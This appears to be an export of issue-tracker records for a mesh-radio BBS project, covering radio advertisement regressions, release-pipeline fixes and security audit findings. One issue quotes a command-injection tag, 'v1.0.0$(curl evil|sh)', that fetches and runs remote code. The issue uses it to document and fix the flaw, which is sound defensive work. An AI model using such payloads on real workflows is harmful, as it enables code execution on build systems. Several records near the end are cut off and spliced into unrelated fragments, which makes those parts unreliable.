title: adv_type: 3 fix (#281) doesn't reach already-deployed pymc-companion.yaml files
description: Reported live by TJ: installed v1.1.5 (which reverted adv_type's default from 3 to 1 per #281) and the BBS still advertised as Room Server after removing the contact and rebooting. Root cause: #281 only changed the code's DEFAULT for a MISSING adv_type key. Every HAT deployment set up between #100 (2026-06-13, when adv_type=3 became the shipped default) and #281 (v1.1.5) already has an EXPLICIT 'adv_type: 3' line written into its pymc-companion.yaml -- an explicit value always wins over a code default, so #281 provided zero benefit to any existing deployment, including the reporter's own production instance. Neither existing upgrade path touches the yaml's content: packaging/postinst's pymc-companion self-update block (added in #243) updates the script/service/dependency but never the config; src/setup.rs's wizard only rewrites pymc-companion.yaml when hat_params is Some, which requires the operator to explicitly opt into a 'Reconfigure HAT radio and GPIO settings?' prompt whose default answer is 'no' and whose copy doesn't even mention adv_type. Immediate operator workaround (given to the reporter): sed -i 's/^\(\s*adv_type:\s*\)3\b/\11/' pymc-companion.yaml && systemctl restart pymc-companion.service. Fix: migrate an existing 'adv_type: 3' to '1' unconditionally and idempotently in both places that can reach an existing install -- packaging/postinst (the unattended .deb-upgrade path, the primary documented way to update an existing bridge) and src/setup.rs (the interactive wizard path, so a re-run also fixes it even if the operator declines the full HAT reconfigure).
acceptance_criteria: Running the corrected postinst against a pymc-companion.yaml containing 'adv_type: 3' rewrites it to 'adv_type: 1' in place, preserving all other file content (formatting, comments, other settings) -- verified idempotent (safe to run again, and a no-op if already 1, absent, or the file doesn't exist). Re-running 'supply-drop-bbs setup' against an existing HAT config also corrects a stale adv_type: 3, whether or not the operator opts into the full 'Reconfigure HAT radio and GPIO settings?' prompt. Regression tests for both the Rust migration function and the postinst shell logic, verified to actually catch the bug (revert-and-confirm-failure).
notes: Immediate manual fix given to the reporter for their live instance: edit pymc-companion.yaml's adv_type line to 1 and restart pymc-companion.service. This issue is about the automated migration so the NEXT deployment to upgrade doesn't hit the same dead end.
close_reason: Merged in PR #289: migrates existing adv_type: 3 to 1 in pymc-companion.yaml, both via postinst's unattended .deb-upgrade self-update and via re-running the setup wizard.

title: Release build fails: cross's Docker images have no Node.js/npm for bbs-web's build.rs
description: v1.1.4's release build (all 3 targets) failed at 'Build -- full (default features)' with: thread 'main' panicked at crates/bbs-web/build.rs:26:29: failed to run 'npm install': No such file or directory (os error 2). Root cause: #254's ubuntu-22.04-brownout migration moved release builds from the native runner into cross-rs's Docker images (Ubuntu 16.04-based, per release.yml's own comments) to pin the glibc floor independent of the runner OS. Those images only contain a Rust cross-compilation toolchain -- no Node.js/npm -- but crates/bbs-web/build.rs unconditionally shells out to npm install && npm run build to produce the embedded admin-web frontend (rust-embed reads web/dist/ at compile time). This was never caught because v1.1.4 was the first real release cut since #254 landed (release.yml's own comment on the job timeout literally says 'no dry-run trigger... revisit after the first real release under this pipeline'). Fix: build the frontend once per matrix job on the GitHub Actions runner itself (which has Node.js) via a new Node setup + npm ci/npm run build step, before the cross build calls; teach build.rs to skip its own npm invocation when BBS_WEB_SKIP_NPM_BUILD is set (verifying web/dist/index.html already exists first, rather than silently producing an empty/stale embed); pass that var through cross's container via Cross.toml's [build.env] passthrough list.
acceptance_criteria: A release build (real tag push, or a manual workflow_dispatch/dry-run trigger if one gets added) completes successfully for all 3 targets with the admin-web feature compiled in and a working frontend embedded in the binary. build.rs's new skip path is covered by the fact that the release pipeline itself exercises it; local/CI native builds are unaffected (BBS_WEB_SKIP_NPM_BUILD unset there, npm still runs as before).
close_reason: Merged in PR #285: builds the web frontend on the runner before the cross build steps, teaches build.rs to skip npm via BBS_WEB_SKIP_NPM_BUILD, passed through Cross.toml. Verified locally on both paths.

title: BBS advertises as MeshCore Room Server (adv_type=3), breaking DM/login for all users
description: Critical production regression, reported by TJ as GH #281. #100 (commit eeb3bf2, 2026-06-13) changed the BBS's default MeshCore adv_type from 1 (Chat) to 3 (Room), intending to fix cosmetic mis-categorization in companion apps' contact lists. Confirmed root cause via code inspection (crates/meshcore-companion/src/constants.rs's CMD_SEND_LOGIN/PUSH_CODE_LOGIN_SUCCESS/PUSH_CODE_LOGIN_FAIL) and external verification against the official MeshCore wiki's Companion Radio Protocol docs: MeshCore companion apps treat a Room/Repeater-type contact as requiring a protocol-level login handshake (guest password) before allowing ANY message, and never fall back to a plain DM for that contact type. This BBS does not implement that login handshake at all -- its own username/password flow runs entirely as ordinary message content on top of a ADV_TYPE_CHAT-style plain DM. Advertising as Room made every companion app try to log in first, and the user could never reach the BBS's actual (message-based) login prompt -- i.e. the BBS became completely unreachable for new/unauthenticated users. Fix: revert the default to adv_type=1 (Chat) in contrib/pymc-companion/pymc-companion.py, contrib/pymc-companion/pymc-companion.yaml.example, and src/setup.rs's generated yaml, with comments explaining why Room/Repeater must not be used unless the BBS itself implements the login handshake.
acceptance_criteria: adv_type defaults to 1 (Chat) in all three locations. A fresh setup-wizard-generated pymc-companion.yaml advertises adv_type: 1. Existing deployments pick up the fix after updating pymc-companion.yaml (or reinstalling contrib/pymc-companion/pymc-companion.py) and restarting pymc-companion.service. Comments in all three locations explain the MeshCore protocol-level reason (CMD_SEND_LOGIN) so a future contributor doesn't reintroduce adv_type=3 without understanding the consequence.
close_reason: Merged in PR #282 (fix/revert-room-server-advert-type): reverted adv_type default from Room(3) back to Chat(1) in all 3 locations, root cause confirmed against upstream MeshCore Companion Radio Protocol docs.

title: release.yml build job fails outright during the ubuntu-22.04 deprecation brownout (2026-09-17)
description:
GitHub is brownout-deprecating the ubuntu-22.04 runner image starting 2026-09-17 (fully removed 2027-04-17), and intentionally fails any job pinned to that runner image during the brownout window (actions/runner-images#14254). release.yml's build job was pinned to runs-on: ubuntu-22.04 (added in #239) specifically to fix the prior glibc-drift bug (#238). Since this workflow only fires on v[0-9]* tag pushes, any release cut during a brownout window would fail outright for all three targets.

## Context
Found via retroactive hostile audit of #239/#241/#248 (2026-09-10) -- claim releaseyml-6/7 in .audit/verdicts-retroactive-releaseyml.jsonl, the actual Critical-severity finding from that audit (distinct from the command-injection High finding already fixed in #254). Fixed by switching the build to the cross tool (Docker-container builds pinned to glibc 2.23 via cross@0.2.5), decoupling the glibc floor from the runner OS entirely. Full hostile-audit trail in .audit/REPORT-cross-migration.md.
acceptance_criteria: release.yml's build job no longer depends on a specific runner OS image for its glibc-compatibility guarantee, so it can use a non-deprecated runs-on value without reintroducing the #238 glibc-drift bug.
close_reason: Merged: https://github.com/Mesh-America/supply-drop-bbs/pull/254

title: release.yml: command injection via unquoted github.ref_name in inline shell scripts
description: Found by a retroactive hostile audit of already-shipped changes (#239/#241/#248). Three run: steps in .github/workflows/release.yml (Stage full binary, Package as .deb, Stage headless binary) did 'TAG="${{ github.ref_name }}"' -- GitHub substitutes ${{ }} expressions into the YAML BEFORE bash ever runs the script, so a tag name containing $(...) or backticks gets executed as shell on the release runner, not treated as a literal string. This is GitHub's own documented script-injection anti-pattern (docs.github.com security-hardening-for-github-actions). Confirmed exploitable via an executed repro (both a literal simulation of the substitution, and matching against the workflow's own v[0-9]* tag trigger, which a crafted tag like v1.0.0$(curl evil|sh) would match). Requires push/tag access to exploit -- not exploitable by an arbitrary external contributor via a PR, but a compromised maintainer credential, PAT, or supply-chain-compromised tool that can push tags would have arbitrary code execution on the release-build runner, which has repo write access (contents: write) to publish the release.
acceptance_criteria: All three run: steps route github.ref_name through a step-level env: block (TAG: ${{ github.ref_name }}) and reference $TAG in the script body, never interpolating ${{ github.ref_name }} directly into run: text. Verified via repro that the fix actually prevents the injection (a value containing $(...) is treated as a literal string, not executed). No other workflow in .github/workflows/ has the same pattern for any github.*/steps.* expression.
notes: PR opened: https://github.com/Mesh-America/supply-drop-bbs/pull/254. Verified via repro both that the vulnerability was real and that the fix prevents it. Not merged -- awaiting normal review.

title: openhop-core is unpinned everywhere, now installed as root unattended on every apt upgrade
description:
install.sh's HAT block and packaging/postinst's new pymc-companion self-update block (#243 / supply-drop-bbs-536) both run 'pip install --upgrade openhop-core' (or plain install) with no version pin, as root. install.sh's install was already an accepted risk (supply-drop-bbs-9bs) since it's a deliberate, one-time, operator-driven wizard run -- but postinst's copy of this now runs UNATTENDED on every future 'apt upgrade' of the unrelated core BBS package, on any host with a Pi HAT configured. A single compromised openhop-core release on PyPI would get unattended root code execution on every such host's next routine upgrade, with no operator action required and no version/hash check.

## Context
Found by Security reviewer persona during hostile audit of #243's postinst self-update mechanism (2026-09-10). Severity High/High. .audit/persona-findings-deb-self-update.jsonl.
acceptance_criteria: openhop-core is pinned to a specific, deliberately-bumped version (or hash-verified) in at least the automatic postinst path, ideally consistently in install.sh too. OR the risk is explicitly and permanently accepted with compensating documentation (e.g. release notes flagging any openhop-core bump) -- current state is an inline code comment only.

title: install.sh: self-heal git fetch has no offline fallback, breaking reconfiguration on off-grid hosts
description:
Unlike try_download_binary() (which gracefully degrades to a source build on curl failure), the git fetch/checkout self-heal block has no offline fallback -- a failed fetch (no internet, captive portal, etc.) is a bare set -e abort of the ENTIRE script, before the setup wizard or any reconfiguration step runs. This directly undermines the product's own off-grid/disaster-relief design intent: the script's own closing banner tells operators to re-run install.sh to reconfigure, but an operator on a Pi with no internet (the expected environment) cannot even reach the wizard, even though reconfiguration needs nothing from SRC_DIR's git history.

## Context
Found by Hostile QA persona during retroactive hostile audit of #241/#248 (2026-09-09). Finding 8 in .audit/persona-findings-retroactive-installsh.jsonl.
acceptance_criteria: A failed self-heal fetch warns and continues with the existing local source instead of aborting the whole script, OR an explicit --offline/--skip-update flag bypasses the block entirely for reconfigure-only runs.
close_reason: Fixed: a failed self-heal fetch now warns and continues with the existing local source instead of aborting the whole script. Verified via executed repro.

title: install.sh: corrupted .git left by an interrupted write causes a permanent update failure loop
description:
The self-heal branch selector only checks directory existence of SRC_DIR/.git, never repo health. If a prior git operation was killed mid-write (power loss, OOM-kill -- realistic on a field-deployed off-grid device), .git can be present but corrupted. The directory-existence check stays true, so the script always takes the fetch/checkout branch and fails there every run under set -e -- it never falls through to the git clone branch that would fix it by re-cloning. Operator is stuck until they manually rm -rf SRC_DIR, with no hint from the script.

## Context
Found by Hostile QA persona during retroactive hostile audit of #241/#248 (2026-09-09). Finding 6 in .audit/persona-findings-retroactive-installsh.jsonl. Repro'd by truncating .git/HEAD to garbage: both fetch and checkout -B fail identically with fatal: not a git repository, exit 128, every run.
acceptance_criteria: Replace/augment the directory-existence check with an actual repo-health probe (e.g. git rev-parse --git-dir) and fall back to a clean re-clone (with a warning) when the existing checkout is unhealthy.
close_reason: Fixed: a repo-health probe (HEAD resolves) replaces the bare directory-existence check; an unhealthy .git triggers a clean re-clone instead of a permanent failure loop. Verified via executed repro (old logic aborts the whole script under set -e; new logic recovers).

title: install.sh: checkout -B silently discards local committed changes in SRC_DIR
description:
git checkout -B SRC_BRANCH origin/SRC_BRANCH force-resets the local branch ref, which is NOT subject to git's working-tree merge-safety check. An operator's local commits (e.g. hand-patching a file while debugging on a live host) are silently orphaned with no warning and exit 0 -- the commit becomes unreachable from any branch. Uncommitted changes ARE protected (checkout aborts loudly); only committed local changes are silently lost.

## Context
Found by Hostile QA persona during retroactive hostile audit of #241/#248 (2026-09-09). Finding 5 in .audit/persona-findings-retroactive-installsh.jsonl. Repro confirmed: local commit's file vanished from working tree and became unreachable via git branch --contains.
acceptance_criteria: Before the reset, detect divergent local commits (e.g. git merge-base --is-ancestor HEAD origin/SRC_BRANCH) and save them to a backup branch with an operator-visible warning instead of silently discarding them.
close_reason: Fixed: local commits diverging from the fetched branch are now backed up to a timestamped branch before checkout -B, with a warning. Verified via executed repro.

title: install.sh: no integrity/provenance verification of git-sourced source tree
description:
The self-heal git fetch+checkout block (lines ~230-253) has zero signature/checksum verification of what it pulls from REPO, unlike the binary-download path which verifies SHA256SUMS. Compounding this, the --force flag added in #248 removed the one incidental fail-safe that existed (a non-fast-forward would previously abort loudly). Unverified content is then installed and immediately activated with root privilege: systemd unit files (could set User=root or drop NoNewPrivileges), a udev rule (RUN+= executes as root, triggered near-immediately via udevadm trigger), and in the source-build fallback, cargo build executes arbitrary build.rs/proc-macro code as root. set -e provides no protection here since a malicious fetch/checkout is a normal exit-0 success.

## Context
Found by Security reviewer persona during retroactive hostile audit of #241/#248 (2026-09-09). Findings 1-4 in .audit/persona-findings-retroactive-installsh.jsonl. Exploitability requires a compromised maintainer account/PAT/CI credential, not a generic network MITM (transport is HTTPS).
acceptance_criteria: Git-sourced content is verified before being trusted (e.g. pin to a signed tag/commit SHA verified via git verify-tag, or a published SHA in the release manifest, analogous to the binary path's SHA256SUMS check) OR the risk is explicitly accepted and documented with compensating controls (e.g. warn on unexpected non-fast-forward jumps).
close_reason: Documented as accepted risk with a compensating control: a loud warning on unexpected non-fast-forward history (what a rewritten-history attack or force-push would look like). Full signed-tag verification would need release-signing infra this project doesn't have yet.

title: install.sh's self-healing fetch fails outright on a real (non-fresh) SRC_DIR -- needs --force
description: PR #241 (supply-drop-bbs-o4l) fixed install.sh's SRC_DIR clone to pin to SRC_BRANCH=main instead of floating to the repo's default branch, using 'git fetch --depth 1 origin main:refs/remotes/origin/main' + 'git checkout -B main origin/main' to self-heal an existing checkout on the wrong branch. That fetch is unforced, and on a real /opt/supply-drop-bbs with accumulated history (not a fresh clone, as my WSL testing during #241 used), updating the local refs/remotes/origin/main ref can be a genuine non-fast-forward relative to what is already stored there. Confirmed live in production: the fetch failed outright ('[rejected] main -> origin/main (non-fast-forward)', exit 1) when manually run to recover a host from the #237/#243-driven upgrade gap. Reproduced cleanly in a controlled test (clone, force the local origin/main ref to an old release tag's commit, then fetch the real tip unforced -- same rejection; forced fetch resolves it cleanly). Inside install.sh's own set -e, this failure mode aborts the whole update rather than corrupting state silently, but it defeats the entire purpose of the #241 fix: any host with real accumulated /opt/supply-drop-bbs history cannot self-heal via install.sh at all right now.
acceptance_criteria: install.sh's fetch of SRC_BRANCH adds --force so the local remote-tracking ref always updates regardless of its prior state. Verified via a real repro: force a local origin/main ref to a divergent old commit (e.g. an old release tag), confirm the unforced fetch reproduces the exact production rejection, confirm the forced fetch resolves it and the resulting checkout has current content. shellcheck clean.
notes: PR opened: https://github.com/Mesh-America/supply-drop-bbs/pull/248. Verified end-to-end on production (mesh-america-bbs) -- fix applied manually there, confirmed working via independent third-party MeshCore tooling (contact list, corescope map) now correctly showing Room Server.
close_reason: Merged: https://github.com/Mesh-America/supply-drop-bbs/pull/248

title: INVESTIGATION: production still reports adv_type=1 after pymc-companion.py updated to openhop_core
description: On mesh-america-bbs (production), after replacing pymc-companion.py with the openhop_core version, installing openhop-core into the venv, and restarting pymc-companion.service, the BBS's 'radio bridge connected' log still shows adv_type=1 (Chat), not the expected adv_type=3 (Room) from pymc-companion.yaml. Root cause not yet confirmed -- possible causes being checked: (a) the service restart didn't actually pick up the new file/deps (stale process), (b) pymc-companion.yaml's adv_type field is missing/wrong on this host, (c) pymc-companion.py's own startup log ('Advertising as adv_type=X') doesn't match what's sent in the wire SELF_INFO response -- which would indicate a real bug in how openhop_core's CompanionRadio reports its configured adv_type back to a connected companion-protocol client, distinct from the adv_type=forwarded-to-adv_type_to_flags() path the API-contract audit already verified during #237. Diagnostic commands issued, awaiting results: grep -c openhop_core on the live script, systemctl status timestamp (confirm actual restart), grep adv_type on pymc-companion.yaml, and journalctl for pymc-companion's own 'Advertising as' log line.
acceptance_criteria: Root cause identified and documented here. If a deployment/process issue (stale restart, wrong config), corrected on production and the fix documented so it doesn't recur. If a genuine openhop_core/pymc-companion.py bug in how configured adv_type reaches the companion protocol's SELF_INFO response, filed as its own precisely-scoped bug (this issue can be closed in favor of that one, or repurposed) with a real repro.
close_reason: Root cause found and fixed: /opt/supply-drop-bbs was never touched by the .deb-based upgrade (tracked separately as supply-drop-bbs-536), and once manually synced, the sync itself hit the fetch bug fixed in supply-drop-bbs-e5n / #247-248. Confirmed resolved on production (mesh-america-bbs): BBS now independently verified as Room Server via MeshCore contact details and the corescope map.

title: pymc-companion.py: contacts have zero disk persistence, wiped on every bridge restart
description: openhop_core's (and old pymc_core's) CompanionRadio/ContactStore is purely in-memory -- confirmed via source (src/openhop_core/companion/contact_store.py docstring: 'In-memory contact storage'). pymc-companion.py never calls ContactStore.load_from_dicts() or .to_dicts(), so every restart of pymc-companion.service starts with a completely empty contact list, including which contacts were favourited/protected. The BBS's own AdvertBus 'Persist Mesh Contacts' feature rehydrates its protected-contact state FROM the radio bridge on every reconnect (crates/bbs-plugin-api/src/advert.rs doc comment: 'no new persistent storage; rehydrated from each platform's own wire data on reconnect') and has no mechanism to re-push its own remembered protected contacts back to the radio if the radio's list comes back empty (confirmed: no such code path in crates/bbs-mesh/src/transport.rs). Net effect: restarting pymc-companion.service for ANY reason -- not just an upgrade -- silently loses every protected contact, with no durable record anywhere (the BBS's own belief is also purely in-memory) to recover from. Confirmed live on production (mesh-america-bbs) during the openhop_core migration (#237), triggered because that migration needed pymc-companion restarted for the first time in a while -- routine BBS-only updates never restart it, which is why this hadn't surfaced before. Not a regression from #237 -- pre-existing architectural gap, just newly triggered.\n\nFix path identified: openhop_core's own sibling project 'openhop_repeater' (github.com/openhop-dev/openhop_repeater) has a complete, production-tested reference implementation of exactly this -- repeater/main.py's _restore_companion_state() loads persisted contacts/channels from SQLite via ContactStore.load_from_dicts() at startup (with retry-once-on-mismatch and loud failure rather than silently starting empty), and repeater/data_acquisition/sqlite_handler.py's companion_save_contacts()/companion_load_contacts() implement the SQLite side. That implementation is deeply embedded in the repeater daemon's much larger multi-purpose SQLite layer (sensor data, MQTT, GPS, thousands of lines) -- not directly reusable, but proves the pattern and gives a concrete reference to adapt. For pymc-companion.py's much smaller scope, plan is a small dedicated SQLite file storing pubkey/name/adv_type/flags, loaded via load_from_dicts() once at startup before the companion starts serving, saved via to_dicts() on every contact mutation or periodically.
acceptance_criteria: pymc-companion.py persists ContactStore contents (at minimum: pubkey, name, adv_type, flags/favourite bit, out_path/out_path_len, lastmod, last_advert_timestamp -- whatever AdvertRecord/FavouriteSnapshot on the Rust side actually needs to be preserved) to a durable local file, loaded on startup before the companion begins serving connections, and saved on every contact add/update/remove (or periodically with an acceptable data-loss window, if immediate-write proves too expensive -- document the tradeoff either way). Restarting pymc-companion.service no longer loses previously-favourited contacts: verified via a real repro (favourite a contact, restart pymc-companion.service, confirm the BBS's next reconnect still reports it as protected). Startup failure to load a persisted file that should have data fails loudly (matching openhop_repeater's retry-once-then-raise pattern) rather than silently starting empty and risking the next save overwriting good data with nothing.
notes: PR opened: https://github.com/Mesh-America/supply-drop-bbs/pull/250 (branch feat/pymc-companion-contacts-persistence -> next). Hostile-audited: found and fixed a Critical bug (zero-byte/truncated file silently read as empty), plus corrected a false claim about matching openhop_repeater's reference pattern (now actually uses asyncio.to_thread(), matching it for real). Full round-trip test suite passes against real openhop-core 1.1.3. Not merged -- awaiting normal review per user instruction.
close_reason: Merged: https://github.com/Mesh-America/supply-drop-bbs/pull/250

title: Self-updating .deb: auto-update pymc-companion on Pi HAT hosts during dpkg upgrade
description: The .deb package (and raw-binary update method) only ever replaces the supply-drop-bbs binary -- neither touches pymc-companion.py or its Python venv dependency. Confirmed in production: a real operator upgraded via the documented .deb one-liner and their Pi HAT bridge silently kept running the pre-openhop_core-migration script for hours, with the adv_type/Room-Server fix never taking effect, until manually diagnosed and fixed by hand. Every .deb/binary-upgrading Pi HAT user has this same silent gap today -- there is no detect-and-warn mechanism, so most operators would never know an update didn't fully apply. Decision: bundle contrib/pymc-companion/pymc-companion.py and pymc-companion.service into the .deb package itself, and have packaging/postinst detect an existing /opt/pymc-companion (i.e. this host has a HAT configured) and automatically re-copy the files, pip install --upgrade the openhop-core dependency in the existing venv, and restart pymc-companion.service -- mirroring what install.sh's HAT block already does, just triggered by dpkg -i instead of the guided script. User approved this approach (option 3 of 3 presented) over the lower-effort alternatives (docs-only, or a startup version-mismatch warning).
acceptance_criteria: packaging/postinst detects /opt/pymc-companion (HAT install) and, when present, updates pymc-companion.py + pymc-companion.service from the .deb's bundled copies, runs pip install --upgrade openhop-core (and any other declared deps) in the existing venv, and restarts pymc-companion.service -- all without user intervention beyond the normal dpkg -i / apt upgrade. release.yml's .deb packaging step bundles the two contrib files. Tested end-to-end: install an old .deb with a HAT configured, upgrade via the new .deb, confirm pymc-companion.py content and adv_type on the wire actually changed without any manual step. postinst failures degrade gracefully (log clearly, do not abort the whole package install over a HAT-bridge update failure) since the core BBS binary update must not be blocked by this.
close_reason: Merged: https://github.com/Mesh-America/supply-drop-bbs/pull/269

title: install.sh's own source clone should pin to main, not float to the repo's default branch
description: install.sh's own git clone/pull of  (/opt/supply-drop-bbs) had no branch specified, so it tracked whatever GitHub's default branch was -- currently 'next' (confirmed via gh api repos/.../. --jq .default_branch). But the install.sh SCRIPT ITSELF is only ever fetched by real users from the 'main' branch specifically (the documented curl URL is hardcoded to /main/install.sh). This created a live, active mismatch: right now, the public main-branch install.sh still runs 'pip install pymc_core' (its own unreleased logic), but its internal clone (tracking default-branch=next, which already has the openhop_core migration merged) copies a NEW pymc-companion.py that imports openhop_core instead. Any real Pi HAT install or update following the documented curl command right now would install the wrong dependency into the venv and then copy a script that imports a different one -- ModuleNotFoundError, immediate crash. Confirmed by fetching the live main-branch install.sh and comparing against next's content.
acceptance_criteria: install.sh's SRC_DIR clone/update logic explicitly pins to a fixed SRC_BRANCH=main (not the repo's floating default branch), with a comment explaining why. The update path self-heals an existing SRC_DIR that's on the wrong branch (e.g. from an older install cloned before this fix existed) rather than just fast-forwarding whatever's currently checked out. Tested against three scenarios: fresh clone, existing clone stuck on a different branch (self-heals), existing clone already on main (routine update still works). shellcheck clean.
notes: PR opened: https://github.com/Mesh-America/supply-drop-bbs/pull/241 (branch fix/install-sh-pin-main-branch -> next). All checks pass, tested 3 scenarios against real repo, shellcheck clean.
close_reason: Merged: https://github.com/Mesh-America/supply-drop-bbs/pull/241

title: Release workflow's runs-on: ubuntu-latest silently drifted to glibc 2.39, breaking Raspberry Pi OS Bookworm installs
description: '.github/workflows/release.yml' build job uses 'runs-on: ubuntu-latest', a floating GitHub Actions label. It recently moved from Ubuntu 22.04 (glibc 2.35) to Ubuntu 24.04 (glibc 2.39) with zero code changes on our side. Every release binary (all 3 targets: aarch64/armv7/x86_64) is now linked against glibc 2.39. Raspberry Pi OS Bookworm -- the current standard Raspberry Pi OS release, and the base for most real Supply Drop BBS deployments -- ships glibc 2.36, which is older and therefore incompatible: running the downloaded binary fails immediately with '/lib/.../libc.so.6: version GLIBC_2.39 not found'. title: Meshtastic fixed-position deferred writes silently dropped on full admin channel
description:
In crates/bbs-meshtastic/src/lib.rs, flush_deferred_writes's match arms for
DeferredWrite::SetFixedPosition and DeferredWrite::RemoveFixedPosition both
did `if cmd_tx.try_send(...).is_ok() { info!(...) }` — on try_send failure
(admin channel full, capacity 16), the write was silently dropped: no log,
no retry, and no other resync path existed until the next full device
reconnect (auto_applied resets and ConfigCompleteId re-derives from
host.node_location()).

This meant a sysop who disables "Share Position in Advert"
([location].share_in_advert) or clears GPS while the admin channel happens
to be full could have a stale position keep broadcasting from the device
indefinitely with zero indication anything failed.

Found during a hostile code audit of the share_in_advert feature, which
increases how often RemoveFixedPosition is exercised in practice, but the
underlying try_send-silently-dropped bug is pre-existing and independent of
that feature.

Fix: mirror DeferredWrite::SetFavoriteNode's existing try_send failure
discipline (Decision 8d) — log a warn! and requeue the write so a future
flush (the next FromRadio message while the session passkey is still held)
retries it, instead of dropping it outright.
acceptance_criteria:
- [ ] SetFixedPosition and RemoveFixedPosition try_send failures in
      flush_deferred_writes log a warn! (visible failure, not silent).
- [ ] On try_send failure, the write is requeued into the deferred-writes
      vector rather than discarded, so it is retried on the next flush
      attempt within the same connection.
- [ ] Regression tests cover both variants failing on a closed/saturated
      cmd_tx channel and prove the write survives in the deferred queue.
- [ ] cargo fmt --all --check, cargo test --workspace, cargo clippy
      --workspace -- -D warnings, and cargo doc --workspace --no-deps
      --all-features all pass on Linux/WSL.
notes: Fixed in https://github.com/Mesh-America/supply-drop-bbs/pull/220 (branch fix/fixed-position-write-drop-on-full-channel). Requeue-on-try_send-failure applied to SetFixedPosition/RemoveFixedPosition in flush_deferred_writes, mirroring SetFavoriteNode's Decision 8d. 3 regression tests added. fmt/clippy/test --workspace/doc all clean; independent hostile review found no defects.

title: MeshCore: GetContacts only runs once at connect, so nodes that DM the BBS afterward never get a full contact record
description:
Discovered during live hardware testing 2026-09-03 while testing PR #189 (feat/persist-mesh-contacts) against a real MeshCore companion device.

REPRODUCTION: A real device (verified via node_credentials in bbs.sqlite: pubkey prefix 74a8cc40a069, user "bourbonator") successfully registered an account via DM over MeshCore -- proving round-trip message exchange works. Despite the operator triggering "share my info"/advert broadcast on their MeshCore client SEVERAL times afterward, `contacts discovered` still shows this node's record permanently stuck with type=unknown and protected=no.

ROOT CAUSE (confirmed via live debug logs): the node's genuine advert broadcast IS reaching the BBS, but arrives as a distinct `InboundFrame::LogRxData` frame (a raw/undecoded packet capture, crates/meshcore-companion/src/frame.rs PUSH_CODE_LOG_RX_DATA at line ~546-554), not as `InboundFrame::NewAdvert` (PUSH_CODE_NEW_ADVERT, the structured 147-byte full-contact push crates/bbs-plugin-api::AdvertBus::upsert_contact expects). crates/bbs-mesh/src/transport.rs's handle_frame has ZERO handling for LogRxData -- confirmed via the actual debug log line: `mesh: ignoring frame LogRxData { snr_byte: 50, rssi_byte: -10, raw: [18, 0, 116, 168, 204, 64, 160, 105, ...] }` -- note the raw payload's bytes 3-8 ([116,168,204,64,160,105]) exactly match this node's real pubkey prefix, and the tail of the raw payload contains readable ASCII "Mesh America" (the node's configured name), confirming this LogRxData capture genuinely IS this node's real advert content, just not decoded into a Contact record. Separately, a proper PUSH_CODE_ADVERT (32-byte, pubkey-only "short advert") for the same prefix DOES arrive ~0.15s later and IS processed via upsert_short -- explaining exactly why the record exists but is permanently stuck as an unclassified stub: AdvertBus::decide_favourite (advert.rs ~969-981) requires has_full_record=true before considering protection, and has_full_record is only ever set by upsert_contact/upsert_meshtastic_node (never by upsert_short), so this node can never become eligible for protection no matter how many times it sends a DM, since only NewAdvert/Contact frames set has_full_record and none has ever arrived for it.

WHY THIS MATTERS: this appears to defeat the core promise of the "Persist Mesh Contacts" feature for at least some real MeshCore companion devices/firmware -- a node can complete real DM traffic (prove it's a live, chat-capable client) and STILL never become protectable, because the companion firmware is choosing to report its advert as a raw LogRxData capture instead of the structured NewAdvert push the BBS code exclusively relies on. Given repeated real hardware adverts all showed the same behavior (not a one-off), this may not be a rare edge case.

OPEN QUESTIONS needing further investigation (could not be resolved from source code alone):
1. WHY does the companion firmware send this specific packet as LogRxData instead of auto-decoding it as PUSH_CODE_NEW_ADVERT? Is this a firmware setting/mode (e.g. a debug/spectrum-analysis feature that's inadvertently capturing legitimate adverts), a companion protocol version difference, or does it only auto-decode DIRECT (not relayed/multi-hop) adverts?
2. Is LogRxData's raw payload actually a full on-air MeshCore packet (header + routing/path info + inner Contact-shaped payload), such that the inner payload COULD be extracted and parsed as a Contact record if the BBS chose to decode it -- or does it lack necessary fields entirely? The raw capture in the reproduction above was 124 bytes (after stripping the 2-byte snr/rssi header), not exactly 147 (the fixed Contact-body size PUSH_CODE_NEW_ADVERT delivers) -- consistent with LogRxData carrying a raw ON-AIR packet (header+path+payload) rather than an already-unwrapped Contact body, meaning a real fix would need to parse MeshCore's actual mesh-packet wire format, not just reuse parse_contact() on the raw bytes directly.
3. Does this affect all MeshCore companion firmware/devices, or specifically the hardware used in this test session? Needs testing against a second device/firmware version to know if this is universal or device-specific.

ACCEPTANCE CRITERIA: either (a) a fix that extracts genuine advert/contact data from LogRxData frames when possible, letting affected nodes become protectable without requiring a separately-triggered NEW_ADVERT push, or (b) if investigation concludes LogRxData genuinely cannot carry parseable Contact data reliably, a documented, disclosed limitation (matching this feature's existing pattern in docs/PROTOCOL.md for the Meshtastic firmware-crash risk, MeshCore prefix-collision, and self-identification limitations) explaining precisely which devices/firmware are affected and why, plus whatever operator-side workaround exists (if any) to get affected nodes protected.
acceptance_criteria: Either a code fix lets affected nodes become protectable without a separate full-advert push, or the limitation is precisely documented in docs/PROTOCOL.md (device/firmware scope, root cause, workaround if any) matching the feature's existing disclosed-limitation pattern. Either way, the open questions above must be resolved with evidence (a second device test, or MeshCore protocol documentation), not left as speculation.
notes: Confirmed fixed via real MeshCore hardware retest by TJ (2026-09-03): after rebuilding and restarting with commit e31081c, the previously-stuck node became a protected contact as expected.
close_reason: Closed

`FavouriteSnapshot` also carries `generation: u64` now, which is what `revert_protect` actually compares against**) in `crates/bbs-plugin-api/src/advert.rs`. **Then**, now that `FavouriteOutcome` exists and T002b's `AdvertBusInner` storage is in place, add a private, lock-free helper — `fn decide_favourite(inner: &mut AdvertBusInner, pubkey: [u8;32], is_eligible: impl Fn(u8) -> bool) -> FavouriteOutcome` — containing the actual decision logic (has_full_record check: `!record.has_full_record` → `NoRecordYet`; title: atomic_write_file's .tmp sibling has the same symlink-following exposure the .lock file had

The equivalent exposure on the NEW <config_path>.lock sidecar was fixed in #227 (O_NOFOLLOW via OpenOptionsExt::custom_flags, no unsafe needed -- see crates/bbs-core/src/config_lock.rs). title: doc[section][key] = value panics can abort the whole server under release-min
